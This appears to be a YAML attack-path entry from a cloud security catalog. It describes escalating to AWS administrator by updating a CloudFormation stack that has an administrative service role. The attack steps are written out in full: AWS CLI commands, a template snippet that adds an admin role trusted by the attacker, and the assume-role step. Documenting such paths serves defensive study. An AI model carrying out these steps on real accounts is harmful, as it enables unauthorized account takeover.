attackVisualization:
  nodes:
  - id: start
    label: Starting Principal
    type: principal
    description: 'The starting principal (user or role) with `cloudformation:UpdateStack`
      permission on the target stack. This principal can modify the stack template
      to add new AWS resources that will be created with the stack''s service role
      permissions.

      '
  - id: existing_stack
    label: Existing CloudFormation Stack
    type: resource
    description: 'An existing CloudFormation stack with an administrative service
      role attached. The stack''s service role typically has elevated permissions
      (e.g., AdministratorAccess) to manage infrastructure resources. The attacker
      has permission to update this specific stack through `cloudformation:UpdateStack`.

      '
  - id: stack_role
    label: Stack's Administrative Service Role
    type: principal
    description: 'The IAM role attached to the CloudFormation stack as its service
      role. This role trusts cloudformation.amazonaws.com and has administrative permissions
      required to manage infrastructure. When the stack is updated, CloudFormation
      uses this role''s permissions to create, modify, or delete resources defined
      in the template.

      '
  - id: update_template
    label: Update Stack Template
    type: payload
    color: '#99ccff'
    description: 'The attacker modifies the stack template to add a new IAM role resource
      with administrative permissions and a trust policy allowing the attacker to
      assume it. The modified template is then applied to the stack using `cloudformation:UpdateStack`.


      The new IAM role typically includes:

      - `AssumeRolePolicyDocument` with trust policy allowing the attacker''s principal
      to assume it

      - `ManagedPolicyArns` including arn:aws:iam::aws:policy/AdministratorAccess

      - Or inline policies granting administrative permissions


      This appears as legitimate infrastructure management activity, making it harder
      to detect than direct IAM modifications.

      '
  - id: new_admin_role
    label: Newly Created Admin Role
    type: principal
    description: 'The new IAM role created by the CloudFormation stack update. This
      role has administrative permissions (AdministratorAccess or equivalent) and
      a trust policy that allows the starting principal to assume it. The role is
      created using the stack''s administrative service role permissions, bypassing
      the starting principal''s limited IAM permissions.

      '
  - id: admin_outcome
    label: Effective Administrator
    type: outcome
    description: 'The attacker successfully assumes the newly created admin role and
      gains full administrative access to the AWS account. The privilege escalation
      is complete.

      '
  edges:
  - from: start
    to: existing_stack
    label: cloudformation:UpdateStack
    description: "The attacker identifies a CloudFormation stack with an administrative\
      \ service role and uses `cloudformation:UpdateStack` to modify the stack template.\
      \ This requires permission to update the specific stack.\n\nFirst, identify\
      \ target stacks with elevated service roles:\n```bash\naws cloudformation describe-stacks\
      \ \\\n  --stack-name TARGET_STACK_NAME \\\n  --query 'Stacks[0].[StackName,StackStatus,RoleARN]'\n\
      ```\n\nThen retrieve the current template:\n```bash\naws cloudformation get-template\
      \ \\\n  --stack-name TARGET_STACK_NAME \\\n  --query 'TemplateBody'\n```\n"
  - from: existing_stack
    to: stack_role
    label: Stack uses service role
    description: 'The CloudFormation stack is configured to use an administrative
      IAM role as its service role. All resource creation, modification, and deletion
      operations performed by the stack execute with this role''s permissions. This
      is the key to the privilege escalation - the attacker leverages the stack''s
      elevated permissions to create resources they couldn''t create directly.

      '
  - from: stack_role
    to: update_template
    label: Modify template
    description: "The attacker creates a modified version of the stack template that\
      \ adds a new IAM role resource with administrative permissions. The new role\
      \ includes a trust policy allowing the attacker's principal to assume it.\n\n\
      Example IAM role resource to add to template:\n```yaml\nEscalatedAdminRole:\n\
      \  Type: AWS::IAM::Role\n  Properties:\n    RoleName: escalated-admin-role\n\
      \    AssumeRolePolicyDocument:\n      Statement:\n        - Effect: Allow\n\
      \          Principal:\n            AWS: arn:aws:iam::ACCOUNT_ID:user/ATTACKER_USER\n\
      \          Action: sts:AssumeRole\n    ManagedPolicyArns:\n      - arn:aws:iam::aws:policy/AdministratorAccess\n\
      ```\n"
  - from: update_template
    to: new_admin_role
    label: Stack creates new admin role
    description: "Update the stack with the modified template. The stack's administrative\
      \ service role executes the template and creates the new IAM role with admin\
      \ permissions.\n\nCommand:\n```bash\naws cloudformation update-stack \\\n  --stack-name\
      \ TARGET_STACK_NAME \\\n  --template-body file://modified-template.json \\\n\
      \  --capabilities CAPABILITY_NAMED_IAM\n```\n\nWait for the update to complete:\n\
      ```bash\naws cloudformation wait stack-update-complete \\\n  --stack-name TARGET_STACK_NAME\n\
      ```\n\nThe `--capabilities CAPABILITY_NAMED_IAM` flag is required when the template\
      \ creates IAM resources with custom names.\n"
  - from: new_admin_role
    to: admin_outcome
    label: sts:AssumeRole
    description: "The attacker assumes the newly created admin role using `sts:AssumeRole`.\
      \ The role's trust policy explicitly allows the attacker's principal to assume\
      \ it, and the role has administrative permissions.\n\nCommand:\n```bash\naws\
      \ sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/escalated-admin-role\
      \ \\\n  --role-session-name escalation-session\n```\n\nConfigure the AWS CLI\
      \ with the temporary credentials from the assume-role response, then verify\
      \ administrative access:\n```bash\naws iam list-users\n```\n\nThe attacker now\
      \ has full administrative access to the AWS account.\n"
